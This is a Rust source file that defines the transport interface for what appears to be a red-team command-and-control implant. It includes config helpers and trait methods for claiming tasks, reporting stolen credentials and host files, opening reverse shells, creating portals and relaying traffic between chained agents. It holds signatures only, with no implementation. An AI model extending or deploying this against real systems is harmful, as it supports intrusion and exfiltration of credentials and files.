use anyhow::Result;
use pb::{c2::*, config::Config};
use std::collections::HashMap;
use std::sync::mpsc::{Receiver, Sender};

/// Helper function to extract the active URI from config.
/// Strips query parameters from the URI.
pub fn extract_uri_from_config(config: &Config) -> Result<String> {
    if let Some(info) = &config.info {
        if let Some(available_transports) = &info.available_transports {
            let active_idx = available_transports.active_index as usize;
            let transport = available_transports
                .transports
                .get(active_idx)
                .or_else(|| available_transports.transports.first())
                .ok_or_else(|| anyhow::anyhow!("No transports configured"))?;

            let uri = transport
                .uri
                .split('?')
                .next()
                .unwrap_or(&transport.uri)
                .to_string();
            Ok(uri)
        } else {
            Err(anyhow::anyhow!("No available_transports in config"))
        }
    } else {
        Err(anyhow::anyhow!("No beacon info in config"))
    }
}

/// Helper function to extract the extra configuration as a HashMap from config.
/// Returns an empty HashMap if parsing fails or no extra is configured.
pub fn extract_extra_from_config(config: &Config) -> HashMap<String, String> {
    if let Some(info) = &config.info {
        if let Some(available_transports) = &info.available_transports {
            let active_idx = available_transports.active_index as usize;
            if let Some(transport) = available_transports
                .transports
                .get(active_idx)
                .or_else(|| available_transports.transports.first())
            {
                return serde_json::from_str::<HashMap<String, String>>(&transport.extra)
                    .unwrap_or_else(|_| HashMap::new());
            }
        }
    }
    HashMap::new()
}

#[async_trait::async_trait]
pub trait Transport: Send + Sync {
    fn clone_box(&self) -> Box<dyn Transport + Send + Sync>;

    // Init will initialize a new instance of the transport with no active connections.
    #[allow(dead_code)]
    fn init() -> Self
    where
        Self: Sized;

    // New will create a new instance of the transport using the Config.
    // The URI is extracted from config.info.available_transports at the active_index.
    #[allow(dead_code)]
    fn new(config: Config) -> Result<Self>
    where
        Self: Sized;

    ///
    /// Contact the server for new tasks to execute.
    #[allow(dead_code)]
    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse>;

    ///
    /// Fetch an asset from the server, returning one or more chunks of data.
    /// The maximum size of these chunks is determined by the server.
    /// The server should reply with two headers:
    ///   - "sha3-256-checksum": A SHA3-256 digest of the entire file contents.
    ///   - "file-size": The number of bytes contained by the file.
    ///
    /// If no associated file can be found, a NotFound status error is returned.
    #[allow(dead_code)]
    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        sender: Sender<FetchAssetResponse>,
    ) -> Result<()>;

    ///
    /// Report a credential to the server.
    #[allow(dead_code)]
    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse>;

    ///
    /// Report a file from the host to the server.
    /// Providing content of the file is optional. If content is provided:
    ///   - Hash will automatically be calculated and the provided hash will be ignored.
    ///   - Size will automatically be calculated and the provided size will be ignored.
    /// Content is provided as chunks, the size of which are up to the agent to define (based on memory constraints).
    /// Any existing files at the provided path for the host are replaced.
    #[allow(dead_code)]
    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse>;

    ///
    /// Report the active list of running processes. This list will replace any previously reported
    /// lists for the same host.
    #[allow(dead_code)]
    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse>;

    ///
    /// Report execution output for a task.
    #[allow(dead_code)]
    async fn report_output(&mut self, request: ReportOutputRequest)
        -> Result<ReportOutputResponse>;

    ///
    /// Open a shell via the transport.
    #[allow(dead_code)]
    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()>;

    ///
    /// Create a portal via the transport.
    #[allow(dead_code)]
    async fn create_portal(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
    ) -> Result<()>;

    #[allow(dead_code)]
    fn get_type(&mut self) -> pb::c2::transport::Type;
    /// Returns true if the transport is fully initialized and active
    #[allow(dead_code)]
    fn is_active(&self) -> bool;

    /// Returns the name of the transport protocol (e.g., "grpc", "http")
    #[allow(dead_code)]
    fn name(&self) -> &'static str;

    /// Returns a list of available transports that this instance can switch to or supports.
    #[allow(dead_code)]
    fn list_available(&self) -> Vec<String>;

    /// Forward raw (pre-encrypted) bytes bidirectionally over a gRPC stream.
    /// Used by chained transports (Agent A) to proxy C2 traffic from Agent B.
    #[allow(dead_code)]
    async fn forward_raw(
        &mut self,
        path: String,
        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
    ) -> anyhow::Result<()>;
}
